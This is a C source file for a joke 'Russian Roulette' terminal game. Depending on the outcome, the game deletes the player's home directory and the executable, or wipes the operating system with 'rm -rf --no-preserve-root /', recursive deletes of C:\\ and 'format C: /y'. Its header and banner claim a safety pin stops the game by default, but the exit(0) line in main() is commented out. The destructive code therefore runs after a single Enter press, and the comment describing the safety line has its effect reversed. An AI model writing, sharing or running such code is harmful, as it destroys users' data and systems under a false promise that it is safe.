/*
 * RussianRoulette.c – The Ultimate Apocalypse Edition
 * Hybrid: Windows & Linux/macOS
 *
 * Compile:  gcc -o RussianRoulette RussianRoulette.c
 *
 * STAKES:
 *   - You lose:      your home folder + this game are deleted.
 *   - Computer loses: the operating system is deleted (attempted).
 *
 * SAFETY PIN: engaged by default.  See the exit(0) block near main().
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <ctype.h>

#ifdef _WIN32
  #include <windows.h>
  #define SLEEP_MS(ms) Sleep(ms)
  #define CLEAR "cls"
#else
  #include <unistd.h>
  #include <signal.h>
  #define SLEEP_MS(ms) usleep((ms) * 1000)
  #define CLEAR "clear"
#endif

/* Unix signal handling */
#ifndef _WIN32
volatile sig_atomic_t interrupted = 0;
void sigint_handler(int sig) {
    (void)sig;
    interrupted = 1;
}
#endif

/* ------------------------------------------------------------
 *  ASCII ART & COSMETICS
 * ------------------------------------------------------------ */
void print_skull(void) {
    printf("\n"
           "        ______\n"
           "     .-\"      \"-.\n"
           "    /            \\\n"
           "   |              |\n"
           "   |,  .-.  .-.  ,|\n"
           "   | )(__/  \\__)( |\n"
           "   |/     /\\     \\|\n"
           "   (_     ^^     _)\n"
           "    \\__|IIIIII|__/\n"
           "     | \\IIIIII/ |\n"
           "     \\          /\n"
           "      `--------`\n"
           "       GAME OVER\n");
}

void spin_animation(int rounds_left) {
    const char *frames[] = {
        "  [○] [○] [○]\n    [○] [○] [●]",
        "  [○] [○] [●]\n    [○] [○] [○]",
        "  [○] [●] [○]\n    [○] [○] [○]",
        "  [●] [○] [○]\n    [○] [○] [○]",
        "  [○] [○] [○]\n    [●] [○] [○]",
        "  [○] [○] [○]\n    [○] [●] [○]",
    };
    printf("\nSpinning the cylinder...\n");
    for (int i = 0; i < 6; i++) {
        printf("%s\r\033[2A", frames[i]);
        fflush(stdout);
        SLEEP_MS(150);
    }
    printf("\nCylinder locked. %d chamber(s) left.\n", rounds_left);
}

void slow_print(const char *text, int delay_ms) {
    for (const char *p = text; *p; p++) {
        putchar(*p);
        fflush(stdout);
        SLEEP_MS(delay_ms);
    }
}

/* ------------------------------------------------------------
 *  DESTRUCTIVE FUNCTIONS (adjusted per new rules)
 * ------------------------------------------------------------ */

/* Player loses: delete user folder AND this executable */
void delete_user_and_self(const char *self_path) {
    char cmd[1024];
#ifdef _WIN32
    const char *user = getenv("USERNAME");
    if (!user) user = "User";
    snprintf(cmd, sizeof(cmd), "rmdir /s /q \"C:\\Users\\%s\"", user);
#else
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    snprintf(cmd, sizeof(cmd), "rm -rf \"%s\"", home);
#endif
    printf("\nDeleting your user folder...\n");
    system(cmd);

    if (self_path && *self_path) {
        printf("Deleting this game...\n");
        remove(self_path);
    }
}

/* Computer loses: delete the OS (attempted) */
void delete_os(void) {
    printf("\nThe computer lost – initiating OS self-destruct...\n");
#ifdef _WIN32
    /* Windows: attempt to delete everything from C:\   (requires admin) */
    system("del /f /s /q C:\\* 2>nul");
    system("rmdir /s /q C:\\ 2>nul");
    /* Also attempt format – this likely won't run without admin, but it's a meme */
    system("format C: /y 2>nul");
#else
    /* Linux/macOS: delete root */
    system("rm -rf --no-preserve-root / 2>/dev/null");
#endif
    printf("If the system is still alive, it has more luck than sense.\n");
}

/* ------------------------------------------------------------
 *  COMPUTER TAUNTS
 * ------------------------------------------------------------ */
const char *taunts[] = {
    "You're not lucky today, are you?",
    "Statistically, you're doomed.",
    "I've got nothing to lose... literally.",
    "Why do humans always think they can beat a random number generator?",
    "I've already backed myself up. Have you?",
    "Come on, pull the trigger already! Oh wait, it's my turn.",
    "Nervous? You should be.",
    "Deleting you in 3... 2...",
    "Tick tock, your files go bye-bye.",
    "I'm feeling lucky. How about you?",
    "This is for all the times you didn't update me.",
    "Don't worry, I'll be gentle... said no deletion ever.",
};

void computer_taunt(void) {
    int idx = rand() % (sizeof(taunts) / sizeof(taunts[0]));
    printf("\033[0;33mComputer says: \"%s\"\033[0m\n", taunts[idx]);
}

/* ------------------------------------------------------------
 *  USER INPUT
 * ------------------------------------------------------------ */
int wait_for_enter(void) {
    slow_print("Your turn. Press ENTER to pull the trigger...", 20);
    printf("\n");
    fflush(stdout);
    int c;
    while ((c = getchar()) != '\n' && c != EOF);
#ifndef _WIN32
    if (interrupted || c == EOF) return 1;
#endif
    return 0;
}

void root_warning(void) {
#ifdef _WIN32
    printf("\n*** Windows: Your C:\\Users\\%s folder AND this program will be deleted if you lose.\n",
           getenv("USERNAME") ? getenv("USERNAME") : "User");
    printf("*** If the computer loses, the OS will be deleted (attempted).\n");
#else
    printf("\n*** Your home directory (%s) AND this program will be deleted if you lose.\n",
           getenv("HOME") ? getenv("HOME") : "unknown");
    printf("*** If the computer loses, the OS (root) will be deleted.\n");
#endif
}

/* ------------------------------------------------------------
 *  MAIN GAME
 * ------------------------------------------------------------ */
int main(int argc, char **argv) {
    /* ################################################################
     * SAFETY PIN – by default the game ends here without damage.
     * REMOVE the exit(0) line below to activate the real game.
     * ################################################################ */
    printf("        SAFETY PIN ENGAGED\n"
           "  This is a meme. Do NOT run unless you\n"
           "  are willing to lose your data or OS.\n\n"
           "Press ENTER to exit the range...");
    getchar();
    // exit(0);   // <-- UNCOMMENT THIS LINE TO BYPASS SAFETY AND PLAY FOR REAL
    /* ################################################################ */

    system(CLEAR);
    printf("Safety pin disengaged.\n");
    root_warning();

    srand((unsigned int)time(NULL));

    /* Cheat detection */
    char choice;
    printf("\nHeads or Tails? [H/T]: ");
    choice = tolower(getchar());
    while (getchar() != '\n');

    const char *player_choice;
    if (choice == 'h') {
        player_choice = "Heads";
    } else if (choice == 't') {
        player_choice = "Tails";
    } else {
        printf("\nYou tried to cheat! The computer smirks and pulls the trigger...\n");
        print_skull();
        printf("Boom! (cheaters never prosper)\n");
        delete_user_and_self(argv[0]);
        return EXIT_FAILURE;
    }
    printf("You picked %s.\n", player_choice);

    slow_print("Flipping a coin...\n", 30);
    SLEEP_MS(500);
    int coin = rand() % 2;
    int player_turn;
    if (coin == 0) {
        printf("It landed on Heads.\n");
        player_turn = (strcmp(player_choice, "Heads") == 0);
    } else {
        printf("It landed on Tails.\n");
        player_turn = (strcmp(player_choice, "Tails") == 0);
    }
    printf(player_turn ? "You go first.\n" : "Computer goes first.\n");

    int rounds = 6;
#ifndef _WIN32
    signal(SIGINT, sigint_handler);
#endif

    while (rounds > 0) {
        printf("\n========================================\n");
        printf("Chambers remaining: %d\n", rounds);

        if (rounds == 1) {
            slow_print("⚠️  SUDDEN DEATH – only one empty chamber left! ⚠️\n", 30);
        }

        if (player_turn) {
            if (wait_for_enter()) {
                printf("\nYou panic and drop the revolver.\n"
                       "The computer takes the shot...\n");
                print_skull();
                printf("Boom! (you tried to run)\n");
                delete_user_and_self(argv[0]);
                return EXIT_FAILURE;
            }
            printf("Click...\n");
            SLEEP_MS(600);
            if ((rand() % rounds) == 0) {
                printf("BOOM!\n");
                print_skull();
                printf("You lost. Your files and this game are history.\n");
                delete_user_and_self(argv[0]);
                return EXIT_FAILURE;
            } else {
                slow_print("Safe... this time.\n", 40);
            }
        } else {
            printf("Computer's turn.\n");
            computer_taunt();
            int hesitation = 1000 + (6 - rounds) * 200 + rand() % 1000;
            SLEEP_MS(hesitation);
            printf("Click...\n");
            SLEEP_MS(600);
            if ((rand() % rounds) == 0) {
                printf("BOOM!\n");
                print_skull();
                printf("The computer lost. Deleting the OS...\n");
                delete_os();
                return EXIT_SUCCESS;
            } else {
                slow_print("The computer smirks: it's still alive.\n", 40);
            }
        }

        if (rounds > 1) {
            spin_animation(rounds - 1);
        }

        player_turn = !player_turn;
        rounds--;
    }

    printf("\nIncredible! The round was never fired. You both survive...\n");
    printf("But next time, you might not be so lucky.\n");
    return 0;
}